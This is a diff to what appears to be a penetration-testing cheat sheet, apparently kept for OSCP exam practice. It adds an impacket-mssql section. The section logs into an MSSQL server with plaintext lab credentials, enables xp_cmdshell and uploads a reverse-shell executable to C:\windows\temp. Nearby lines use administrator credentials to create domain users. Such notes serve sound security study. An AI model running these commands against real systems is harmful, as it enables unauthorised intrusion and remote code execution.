@@ -479,6 +479,20 @@ impacket-net ignite.local/administrator:Ignite@192.168.1.8 user -create anubhav 
 impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user
 ```
 
+### impacket-mssql
+
+- connection
+
+`impacket-mssqlclient "oscp.exam/sql_svc":Dolphin1@10.10.202.148 -windows-auth`
+
+- enable shell
+
+`enable_xp_cmdshell`
+
+- file upload (only upload)
+
+`upload ./148/rev.exe c:\windows\temp\rev.exe`
+
 ## SMB
 
 ### smbpasswd
